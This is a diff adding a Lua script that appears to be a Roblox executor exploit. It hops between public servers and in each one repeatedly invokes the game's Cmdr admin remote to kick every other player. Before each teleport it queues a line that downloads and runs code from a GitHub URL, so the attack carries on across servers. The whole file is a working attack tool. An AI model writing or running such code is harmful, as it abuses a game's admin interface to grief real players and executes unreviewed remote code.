@@ -1,0 +1,103 @@
+-- Utility: shuffle a table
+local function shuffle(tbl)
+    for i = #tbl, 2, -1 do
+        local j = math.random(i)
+        tbl[i], tbl[j] = tbl[j], tbl[i]
+    end
+end
+
+-- Server hop function
+local function ServerHop()
+    print("[ServerHop] Attempting to server hop...")
+
+    -- Ensure randomness
+    math.randomseed(tick())
+
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local url = string.format(
+        'https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100',
+        placeId
+    )
+
+    -- Fetch server list via executor HTTP
+    local function requestServers(url)
+        if syn and syn.request then
+            return syn.request({Url = url, Method = 'GET'})
+        elseif request then
+            return request({Url = url, Method = 'GET'})
+        else
+            error("No HTTP request function available!")
+        end
+    end
+
+    local success, response = pcall(requestServers, url)
+    if not success or not response or response.StatusCode ~= 200 then
+        print("[ServerHop] Failed to fetch servers, retrying in 1s...")
+        task.delay(1, ServerHop)
+        return
+    end
+
+    -- Decode and filter servers
+    local data = game:GetService("HttpService"):JSONDecode(response.Body).data or {}
+    local candidates = {}
+    for _, server in ipairs(data) do
+        if server.id ~= jobId and server.playing < server.maxPlayers then
+            table.insert(candidates, server.id)
+        end
+    end
+
+    if #candidates == 0 then
+        print("[ServerHop] No available servers, retrying in 1s...")
+        task.delay(1, ServerHop)
+        return
+    end
+
+    shuffle(candidates)
+    local targetId = candidates[1]
+
+    print("[ServerHop] Teleporting to server:", targetId)
+    local ok, err = pcall(function()
+        game:GetService("TeleportService"):TeleportToPlaceInstance(
+            placeId,
+            targetId,
+            game.Players.LocalPlayer
+        )
+    end)
+    if not ok then
+        warn("[ServerHop] Teleport failed:", err)
+        task.delay(1, ServerHop)
+    end
+end
+
+-- Main loop: kick other players if present
+local canHop = true
+while task.wait(0.5) do 
+    local players = game.Players:GetChildren()
+    if #players ~= 1 then 
+        for _, p in pairs(players) do 
+            if p ~= game.Players.LocalPlayer then 
+                local args = {
+                    [1] = "kick " .. p.Name,
+                    [2] = {}
+                }
+
+                local success, err = pcall(function()
+                    game:GetService("ReplicatedStorage"):WaitForChild("CmdrClient"):WaitForChild("CmdrFunction"):InvokeServer(unpack(args))
+                end)
+                if not success then
+                    warn("[Kick] Failed to kick", p.Name, err)
+                else
+                    print("[Kick] Kicked", p.Name)
+                end
+            end
+        end
+    elseif canHop then
+        -- Only queue teleport once
+        canHop = false
+        queueonteleport([[
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenith-Hub/Xenith-Hub/refs/heads/main/KickAllFun"))()
+        ]])
+        ServerHop()
+    end
+end
